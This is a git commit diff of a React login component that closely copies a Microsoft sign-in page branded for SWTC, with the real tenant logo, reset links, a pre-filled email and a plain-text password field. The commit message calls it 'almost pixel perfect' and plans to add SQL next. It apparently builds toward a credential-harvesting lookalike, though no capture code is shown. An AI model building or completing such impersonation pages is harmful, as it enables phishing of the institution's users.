7d3dc32e7cdd26c4376ba5a8e5535ec994bf5c6f
TheMythicalOX <keokline2015@gmail.com>
2025-03-25 00:00:47 -0500

    login almost pixel perfect, just need animation and email part, then sql

--- FrontEnd/swtccopy/src/Components/Login.tsx
+++ FrontEnd/swtccopy/src/Components/Login.tsx
@@ -1,13 +1,20 @@
-import React, { useEffect } from "react";
+import React, { useEffect, useState } from "react";
 import iconSource from "../images/microsofticon.ico";
 import backArrow from "../images/logbackarrow.svg";
 
 const Login = () => {
   const title = "Sign in to your account";
   const icon = iconSource;
-  useEffect(() => {
-    document.title = title;
+  const [useEmail, setEmail] = useState("");
+  const [useTest, setTest] = useState("opacity-[0%] l-[20px]");
+  const test = `transition-all duration-800 ease-in-out relative ${useTest}`;
 
+  useEffect(() => {
+    setEmail("example@email.com");
+
+    setTest("opacity-[100%] l-[0px]");
+
+    document.title = title;
     const link: HTMLLinkElement | null =
       document.querySelector("link[rel*='icon']") ||
       document.createElement("link");
@@ -18,55 +25,84 @@ const Login = () => {
   }, [title, icon]);
   return (
     <div className="loginBody">
-      <div className="w-screen h-screen fixed bg-black opacity-[50%] z-25 "></div>
-      <div className="loginBackgroundGradient z-0 w-screen h-screen flex items-center">
-        <div className="w-[440px] h-[416px] m-auto shadow-stone-900 shadow-md z-50 text-[.9375rem]">
-          <div className="w-full h-[82.5%] bg-white ">
-            <div className="p-[44px]  font-medium">
-              <img
-                src="https://aadcdn.msftauthimages.net/dbd5a2dd-uu6n-8cm1lzzxmp32bd-arusmto4dao1chilpm9uy5s/logintenantbranding/0/bannerlogo?ts=637278424175273182"
-                alt="TMP"
-                className="h-[36px]"
-              />
-              <div>
-                <div className="inline-flex">
-                  <img src={backArrow} alt="TMP" />
-                  <p className="text-stone-700">{"Variable"}</p>
-                </div>
-                <h1 className="w-full h-full text-[1.4rem] box-border font-semibold leading-[1.75rem] my-[12px] text-black">
-                  Enter password
-                </h1>
-                <input
-                  type="text"
-                  placeholder="Password"
-                  className="w-full loginInputBorder text-black border-stone-700"
+      <div className="loginBackgroundGradient z-0 fixed w-screen h-screen"></div>
+      <div className="w-screen h-screen fixed bg-black opacity-[55%] z-25 "></div>
+      <div className=" z-0 w-screen h-[98vh] flex items-center absolute">
+        <div className="w-[440px] h-[416px] m-auto shadow-stone-900 shadow-md z-50 text-[.9375rem] transition-all">
+          <div className="w-full h-[80.75%] bg-white *:transition-all *:duration-800 *:ease-in-out overflow-hidden">
+            <div className={test}>
+              <div className="p-[44px] font-medium">
+                <img
+                  src="https://aadcdn.msftauthimages.net/dbd5a2dd-uu6n-8cm1lzzxmp32bd-arusmto4dao1chilpm9uy5s/logintenantbranding/0/bannerlogo?ts=637278424175273182"
+                  alt="TMP"
+                  className="h-[36px]"
                 />
                 <div>
-                  <a
-                    className="text-[#0067b8] text-[.8125rem] block hover:text-stone-700 hover:underline"
-                    href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAArZK_i9NgGMeb63n-wNPD_0ARB_GuyZumbQ4ObC9NetG8ucSkbbJI3jdp0zS_Lk1zbf6Cw0VxUHBUcHA6nMRFQVBwchQnxUFxECdxcDAdHHRycHgeHnge-H6-PN-LZWqD2jw_YOuIrjVq6wjXyfXqwHHWEVOz1wdVplFvVAFpU0xy5sQa8yp69unt7cs39x70HzbvnntEbLtpGk82KxUrjjcm2I0iPxrON3AUVIphFFacWeokoeVftzCOpmE6qSQOdkaZUwlGOIkm0SB9QhBvCOIzQTxaWq3VHRJhp4bqLEDvlk7LzWnqgkWLklHu3Cv_LGMAI7NH-bs9l7Q7rVwM3AzTCotpmzTmTG4AN0Nglpn0eGoANhXDlmsLQ1bURAEJbGj1qr40Nn2no_o4YFzEs64BYGb3GBLP9bkair4BurEd6Iu71OrBOaJhZoZKgPtdH4djdsGAADvpAyY2t_Vc5fR9mVNmUJMY-Zr5m2GAAn-8q_256wNIYVrNUJcdI0C5BQ9rdVQSdyRfItuFprHQzW1a9a6G0LMENltwO9cYDwEyMIVubgv-1OirMQJV9t88QR8Fyt9-Cr0_WUUNtqHWrEKuTUn5mBFDNd_V2jTkdmiZawOYNwNbYBOzYFb8FqfkIqfrOuj6UNapIaNpmFI5k1c8gyluc8iJguLpVYmUSJlr8TBv8SrHtxXNbhV_czEYsrKmgKJIw9NnJtcNDG9ISoExM4LuGOamZ3ri2PR0BgJ963F5pYhWEIWvyyej2AlH9gUnsEb-2zLxZpn4srxEHvuxTNw_UmT18o3hh59nV1uHL5YOec8pvT5SaTjytLY34vPKTN5JjGZ7uBex-Wx-NertJ2nSQBZD7mAz9erkFrNJ3Vohvq0QB0dLT4__j5g_Xy39OHXn-9OXBx_ffe18OX1JSMEgopIrzTzi6G1dntLJTl_t97cpM45jieftodjLZiKA7a3DtdL7tdIv0&mkt=en-US&hosted=0&device_platform=Linux"
-                  >
-                    Forgot my password
-                  </a>
-                  <div className="w-[108px] min-h-[32px]  float-right">
-                    <input
-                      type="submit"
-                      value="Sign in"
-                      className="bg-[#0067b8] focus:outline-[20px] rounded-[0] w-full h-full focus:underline focus:border-black font-normal py-[4px]  box-border border-[#0067b8] hover:bg-[#005da6] focus:bg-[#005da6] "
-                    ></input>
+                  <div className="inline-flex mt-4">
+                    <img
+                      src={backArrow}
+                      alt="TMP"
+                      className="mr-[2px] hover:cursor-pointer hover:bg-[rgba(0,0,0,0.1)] rounded-full active:bg-[rgba(0,0,0,0.4)]"
+                    />
+                    <p className="text-stone-700 leading-[24px]">{useEmail}</p>
+                  </div>
+                  <h1 className="w-full h-full text-[1.5rem] box-border font-semibold leading-[1.75rem] my-[5px] text-black">
+                    Enter password
+                  </h1>
+                  <input
+                    type="text"
+                    placeholder="Password"
+                    className="w-full loginInputBorder box-border p-[2px] pt-[13px] pb-[7px] text-black border-[rgba(0, 0, 0, 0.4)]"
+                  />
+                  <div>
+                    <a
+                      className="text-[#0067b8] pt-[16px] pl-[2px] text-[.8125rem] block hover:text-stone-700 hover:underline"
+                      href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAArZK_i9NgGMeb63n-wNPD_0ARB_GuyZumbQ4ObC9NetG8ucSkbbJI3jdp0zS_Lk1zbf6Cw0VxUHBUcHA6nMRFQVBwchQnxUFxECdxcDAdHHRycHgeHnge-H6-PN-LZWqD2jw_YOuIrjVq6wjXyfXqwHHWEVOz1wdVplFvVAFpU0xy5sQa8yp69unt7cs39x70HzbvnntEbLtpGk82KxUrjjcm2I0iPxrON3AUVIphFFacWeokoeVftzCOpmE6qSQOdkaZUwlGOIkm0SB9QhBvCOIzQTxaWq3VHRJhp4bqLEDvlk7LzWnqgkWLklHu3Cv_LGMAI7NH-bs9l7Q7rVwM3AzTCotpmzTmTG4AN0Nglpn0eGoANhXDlmsLQ1bURAEJbGj1qr40Nn2no_o4YFzEs64BYGb3GBLP9bkair4BurEd6Iu71OrBOaJhZoZKgPtdH4djdsGAADvpAyY2t_Vc5fR9mVNmUJMY-Zr5m2GAAn-8q_256wNIYVrNUJcdI0C5BQ9rdVQSdyRfItuFprHQzW1a9a6G0LMENltwO9cYDwEyMIVubgv-1OirMQJV9t88QR8Fyt9-Cr0_WUUNtqHWrEKuTUn5mBFDNd_V2jTkdmiZawOYNwNbYBOzYFb8FqfkIqfrOuj6UNapIaNpmFI5k1c8gyluc8iJguLpVYmUSJlr8TBv8SrHtxXNbhV_czEYsrKmgKJIw9NnJtcNDG9ISoExM4LuGOamZ3ri2PR0BgJ963F5pYhWEIWvyyej2AlH9gUnsEb-2zLxZpn4srxEHvuxTNw_UmT18o3hh59nV1uHL5YOec8pvT5SaTjytLY34vPKTN5JjGZ7uBex-Wx-NertJ2nSQBZD7mAz9erkFrNJ3Vohvq0QB0dLT4__j5g_Xy39OHXn-9OXBx_ffe18OX1JSMEgopIrzTzi6G1dntLJTl_t97cpM45jieftodjLZiKA7a3DtdL7tdIv0&mkt=en-US&hosted=0&device_platform=Linux"
+                    >
+                      Forgot my password
+                    </a>
+                    <div className="w-[108px] min-h-[32px] float-right">
+                      <button
+                        type="submit"
+                        className="bg-[#0067b8] active:bg-[rgba(0,0,0,0.4)] active:scale-[95%] mt-[16px] focus-visible:outline focus-visible:border-[0] active:outline-[0] focus:outline outline-black rounded-[0] w-full h-[32px] focus:underline font-normal py-[4px] hover:bg-[#005da6] focus:bg-[#005da6] "
+                      >
+                        Sign in
+                      </button>
+                    </div>
                   </div>
                 </div>
               </div>
             </div>
           </div>
-          <div className="w-full h-[17.5%] bg-[#f2f2f2]">
-            <a
-              className="text-[#0067b8] hover:text-stone-700 hover:underline"
-              href="https://kb.swtc.edu/password"
-            >
-              Password Reset Knowledgebase
-            </a>
+          <div className="w-full h-[19.25%] bg-[#f2f2f2]">
+            <div className="pt-[23px] pl-[44px]">
+              <a
+                className="text-[#0067b8] hover:text-stone-700 hover:underline"
+                href="https://kb.swtc.edu/password"
+              >
+                Password Reset Knowledgebase
+              </a>
+            </div>
           </div>
+        </div>
+      </div>
+      <div className="block fixed bottom-[4px] right-0 z-50 h-[2vh]">
+        <div className="text-white h-fit inline-flex text-[12px] items-center">
+          <a
+            className="mx-[11px] hover:underline"
+            href="https://www.microsoft.com/en-US/servicesagreement/"
+          >
+            Terms of use
+          </a>
+          <a
+            className="mx-[8px] hover:underline"
+            href="https://privacy.microsoft.com/en-US/privacystatement"
+          >
+            Privacy & cookies
+          </a>
+          <p className="mx-[11px] text-[17px] mr-[8px] font-semibold leading-[22px] cursor-pointer mb-1.5 tracking-[3px]">
+            ...
+          </p>
         </div>
       </div>
     </div>
